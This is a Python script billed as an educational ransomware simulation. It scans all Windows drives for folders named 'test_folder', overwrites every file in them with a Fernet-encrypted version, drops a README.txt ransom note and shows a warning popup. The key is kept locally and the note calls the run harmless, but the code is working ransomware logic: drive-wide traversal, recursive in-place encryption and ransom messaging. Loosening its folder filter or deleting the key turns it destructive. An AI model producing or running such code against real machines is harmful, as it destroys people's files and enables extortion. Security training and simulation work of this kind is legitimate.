import os
import string
from cryptography.fernet import Fernet
import ctypes

def generate_key():
    """Generate a new Fernet key and save it to secret.key"""
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file_path, fernet):
    """Encrypt a single file using Fernet (overwrites the original)"""
    try:
        with open(file_path, "rb") as file:
            original_data = file.read()
        encrypted_data = fernet.encrypt(original_data)
        with open(file_path, "wb") as enc_file:
            enc_file.write(encrypted_data)
    except Exception as e:
        print(f"[!] Failed to encrypt {file_path}: {e}")

def drop_ransom_note(folder_path):
    """Create a README.txt ransom note in the folder"""
    note_path = os.path.join(folder_path, "README.txt")
    note_content = (
        "⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️\n\n"
        "=========================================\n"
        "All your files in this folder have been encrypted.\n"
        "To recover them, you need a decryption key.\n\n"
        "This is a simulation for educational purposes.\n"
        "Your files are NOT actually lost.\n"
        "Use the provided decryptor with the 'secret.key' file.\n\n"
        "Stay safe! 🛡️"
    )
    try:
        with open(note_path, "w", encoding="utf-8") as note:
            note.write(note_content)
        print(f"[+] Ransom note placed: {note_path}")
    except Exception as e:
        print(f"[!] Failed to create ransom note: {e}")

def encrypt_folder(folder_path, fernet):
    """Encrypt all files in folder_path (except secret.key and README.txt)"""
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root, file)
            # Skip the key file and the ransom note itself
            if file == "secret.key" or file == "README.txt":
                continue
            encrypt_file(full_path, fernet)
        # Also encrypt files in subdirectories (os.walk already does that)

def main():
    # Generate a new key (this will overwrite any existing secret.key)
    print("[*] Generating new encryption key...")
    key = generate_key()
    fernet = Fernet(key)
    print("[+] Key saved as secret.key")

    found_any = False
    # Scan all drives (A:/ to Z:/) for folders named "test_folder"
    for drive_letter in string.ascii_uppercase:
        drive = f"{drive_letter}:/"
        if os.path.exists(drive):
            for root, dirs, _ in os.walk(drive):
                for dir in dirs:
                    if dir == "test_folder":
                        folder_path = os.path.join(root, dir)
                        print(f"[+] Found test_folder at: {folder_path}")
                        encrypt_folder(folder_path, fernet)
                        drop_ransom_note(folder_path)
                        print(f"[✔] Encrypted: {folder_path}\n")
                        found_any = True

    if not found_any:
        print("[-] No test_folder found on any drive. Nothing to encrypt.")

    # Optional: Show a message box (Windows only) to simulate ransomware popup
    try:
        ctypes.windll.user32.MessageBoxW(
            0,
            "⚠️ ALL FILES IN 'test_folder' HAVE BEEN ENCRYPTED ⚠️\n\n"
            "Read the README.txt for instructions.\n"
            "This is a simulation – your files are safe.",
            "Encryption Complete",
            0x30 | 0x0  # Warning icon, OK button
        )
    except:
        pass

    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()